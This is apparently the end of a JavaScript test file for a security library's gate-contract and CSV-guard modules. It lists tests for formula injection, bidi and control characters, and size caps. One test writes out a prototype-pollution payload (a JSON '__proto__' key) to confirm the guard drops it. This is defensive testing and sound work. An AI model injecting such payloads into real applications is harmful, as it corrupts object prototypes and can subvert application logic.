        mod.compliancePosture("hipaa") === "strict" || typeof mod.compliancePosture("hipaa") === "object");
  // Default gate runs the standard serve / refuse chain on ctx.bytes.
  var g = mod.gate({ profile: "strict" });
  var serve  = await g.check({ bytes: Buffer.from("ok bytes") });
  var refuse = await g.check({ bytes: Buffer.from("a BAD value") });
  check("defineGuard: default gate serves clean bytes",  serve.action === "serve");
  check("defineGuard: default gate refuses on high issue", !refuse.ok && refuse.action === "refuse");
  // Prototype-safe extras copy — __proto__ in spec.extra is dropped.
  var poisoned = b.gateContract.defineGuard({
    name: "demo2", kind: "filename", errorClass: GuardDemoError,
    profiles: PROFILES, postures: POSTURES,
    validate: function () { return { ok: true, issues: [] }; },
    extra: JSON.parse('{"__proto__":{"polluted":true},"safe":1}'),
  });
  check("defineGuard: prototype-pollution key dropped from extras",
        poisoned.safe === 1 && !({}).polluted);
}

async function testGateContractDefineParser() {
  // defineParser assembles the minimal command / safe-* parser shape:
  // the entry point, PROFILES, COMPLIANCE_POSTURES, a profile-name
  // compliancePosture, and extras — no gate / buildProfile / loadRulePack.
  var PROFILES = { strict: { cap: 1 }, balanced: { cap: 2 }, permissive: { cap: 3 } };
  var mod = b.gateContract.defineParser({
    name:    "demo-command",
    entry:   function (line) { return { verb: String(line).toUpperCase() }; },
    errorClass: b.gateContract.GateContractError,
    profiles: PROFILES,
    postures: b.gateContract.ALL_STRICT_POSTURES,
    extra:   { KNOWN: { NOOP: true } },
  });
  check("defineParser: entry exported as validate",      typeof mod.validate === "function");
  check("defineParser: entry runs",                      mod.validate("noop").verb === "NOOP");
  check("defineParser: PROFILES / COMPLIANCE_POSTURES exported",
        mod.PROFILES.strict.cap === 1 && mod.COMPLIANCE_POSTURES.hipaa === "strict");
  check("defineParser: compliancePosture returns profile name",
        mod.compliancePosture("hipaa") === "strict");
  check("defineParser: compliancePosture('nope') → null", mod.compliancePosture("nope") === null);
  check("defineParser: no gate / buildProfile / loadRulePack",
        mod.gate === undefined && mod.buildProfile === undefined && mod.loadRulePack === undefined);
  check("defineParser: extras passed through",           mod.KNOWN.NOOP === true);
  // Custom entryName.
  var parserMod = b.gateContract.defineParser({
    name: "demo-doc", entry: function () { return { ast: true }; }, entryName: "parse",
    errorClass: b.gateContract.GateContractError, profiles: PROFILES,
  });
  check("defineParser: entryName overrides export key",  typeof parserMod.parse === "function" && parserMod.validate === undefined);
}

async function run() {
  // gateContract foundation
  testGateContractSurface();
  testGateContractDefineGateShape();
  testGateContractValidateGateShape();
  await testGateContractMetricsCounters();
  await testGateContractWarnOnlyMode();
  await testGateContractShadowMode();
  await testGateContractRuntimeCap();
  await testGateContractBeforeCheckHook();
  await testGateContractAfterCheckHook();
  await testGateContractOnIssueHookSuppress();
  await testGateContractComposeGates();
  await testGateContractMultiplexGates();
  await testGateContractContentTypeMux();
  await testGateContractBuildProfile();
  await testGateContractBuildProfileCycleDetection();
  await testGateContractDefineGuard();
  await testGateContractDefineParser();

  // guardCsv surface + behavior
  testGuardCsvSurface();
  testGuardCsvSerializeRoundTrip();
  testGuardCsvFormulaInjectionPrefixTab();
  testGuardCsvFormulaInjectionWrap();
  testGuardCsvFullWidthFormulaPrefix();
  testGuardCsvDangerousFunctionDeny();
  testGuardCsvFormulaInjectionReject();
  testGuardCsvFormulaInjectionEveryPrefix();
  testGuardCsvFormulaAllowlist();
  testGuardCsvBidiReject();
  testGuardCsvBidiStrip();
  testGuardCsvControlCharReject();
  testGuardCsvNullByteReject();
  testGuardCsvNumericPrecisionDecimalString();
  testGuardCsvCellTooLargeCap();
  testGuardCsvCellByteCapMultibyte();
  testGuardCsvTooManyRows();
  testGuardCsvValidateBidi();
  testGuardCsvValidateClean();
  testGuardCsvValidateMixedLineEndings();
  testGuardCsvSanitizeStripsBidi();
  testGuardCsvSanitizeAmplificationCap();
  testGuardCsvDetectDialect();
  testGuardCsvSchemaRoundTrip();
  testGuardCsvSchemaTypeMismatch();
  testGuardCsvSchemaNonNullable();
  testGuardCsvSchemaRegex();
  testGuardCsvCompliancePosture();
  testGdprPostureMatchesBalancedTier();
  await testGuardCsvGateClean();
  await testGuardCsvGateRefuseBidi();
  await testGuardCsvGateSanitize();
  await testGuardCsvGateOperatorRules();
  await testGuardCsvGateForensicSnapshot();
  await testGuardCsvGateAuditEmission();
}

module.exports = { run: run };

if (require.main === module) {
  run().then(
    function () { console.log("[guard-csv] OK — " + helpers.getChecks() + " checks passed"); process.exit(0); },
    function (e) { console.error("FAIL:", e && e.stack || e); process.exit(1); }
  );
}
